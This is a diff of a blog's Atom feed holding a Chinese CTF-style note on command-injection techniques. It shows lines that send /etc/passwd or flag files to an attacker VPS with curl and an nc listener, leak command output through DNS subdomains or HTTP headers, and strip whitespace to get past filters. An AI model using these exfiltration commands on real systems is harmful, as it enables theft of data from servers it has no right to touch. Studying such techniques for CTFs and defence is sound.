@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.tharavel.site/"/>
-  <updated>2018-03-23T13:09:25.410Z</updated>
+  <updated>2018-04-07T13:48:55.976Z</updated>
   <id>http://www.tharavel.site/</id>
   
   <author>
@@ -20,7 +20,7 @@
     <link href="http://www.tharavel.site/2018/03/23/command-execute.html"/>
     <id>http://www.tharavel.site/2018/03/23/command-execute.html</id>
     <published>2018-03-23T08:04:37.753Z</published>
-    <updated>2018-03-23T13:09:25.410Z</updated>
+    <updated>2018-04-07T13:48:55.976Z</updated>
     
     <content type="html"><![CDATA[<p>好久没更博客了，就把笔记里的东西整理一下发出来水一篇~<br>本文持续更新~</p>
 <hr>
@@ -36,7 +36,7 @@
 </blockquote>
 <p>或者使用curl上传到vps，并在vps上开启监听进行读取：  </p>
 <blockquote>
-<p>curl -T flag.php “<a href="http://192.168.x.xxx:6666" target="_blank" rel="external">http://192.168.x.xxx:6666</a>“<br>或curl “<a href="http://vpsip/" target="_blank" rel="external">http://vpsip/</a>“ –data-binary @/etc/passwd<br>…<br>在vps上：<br>nc -lvpn 6666</p>
+<p>curl -T flag.php “<a href="http://192.168.x.xxx:6666" target="_blank" rel="external">http://192.168.x.xxx:6666</a>“<br>或curl “<a href="http://vps/" target="_blank" rel="external">http://vps/</a>“ –data-binary @/etc/passwd<br>…<br>在vps上：<br>nc -lvpn 6666</p>
 </blockquote>
 <h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a><strong>空格绕过</strong></h4><p>如果过滤了空格，常用的绕过方法有</p>
 <blockquote>
@@ -100,7 +100,6 @@
 <blockquote>
 <p>curl (你的ip)/?`whoami` 然后查看Apache日志<br>curl `whoami`.3eea625fcaceaafc7db2.d.zhack.ca (该网站能直接返回接受的数据)</p>
 </blockquote>
-<p>第二个方式中用到的网站是<a href="http://dnsbin.zhack.ca" target="_blank" rel="external">http://dnsbin.zhack.ca</a>，这是一个免费无需邀请码的网站，强烈推荐！类似的网站还有<a href="http://ceye.io" target="_blank" rel="external">http://ceye.io</a></p>
 <p>命令执行返回的结果不能包含空格和回车，可以通过base64编码或者如<code>cat flag.php|sed &#39;s/[[:space:]]//g&#39;</code>来清除空格,回车替换可以用<code>sed &#39;:a;N;s/\n/*/;ba&#39;</code>，这样就将回车换成了<em>号 (因为sed默认是逐行处理数据，所以sed默认情况下不会处理到换行符，直接用`sed s/\n/</em>/g`不可行)</p>
 <p>如果不想编码，还可以将数据附在HTTP头，如<code>curl &quot;http://vpsip/&quot; -H &quot;User-Agent: $(id)&quot;</code><br>或者post数据：<code>id | curl &quot;http://vpsip/&quot; --data-binary @-</code></p>
 <h3 id="0X02-常用shell反弹"><a href="#0X02-常用shell反弹" class="headerlink" title="0X02 常用shell反弹"></a>0X02 <strong>常用shell反弹</strong></h3><p>网上有很多文章总结了，这里简单列举几个:  </p>
